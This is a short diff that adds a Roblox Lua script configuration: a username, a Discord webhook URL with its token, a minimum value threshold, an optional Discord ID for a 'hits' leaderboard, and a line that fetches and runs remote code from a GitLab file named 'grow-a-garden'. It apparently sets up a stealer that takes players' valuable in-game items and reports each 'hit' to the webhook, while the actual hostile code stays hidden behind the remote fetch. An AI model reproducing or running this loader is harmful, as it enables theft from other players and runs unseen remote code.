@@ -1,0 +1,6 @@
+Username = "ggtrl95"
+Webhook = "https://discord.com/api/webhooks/1401001878749446305/z85He5xfmuFXMYjZP8M5xeiYFfKT8YOrLUHGoHS0RNGGVza8o4Hh5RGcucmPNxX7j-pz"
+MinimumValue = 1000000
+DiscordID = "bombclatiii" -- optional if you wanna be in hits lb
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))() 
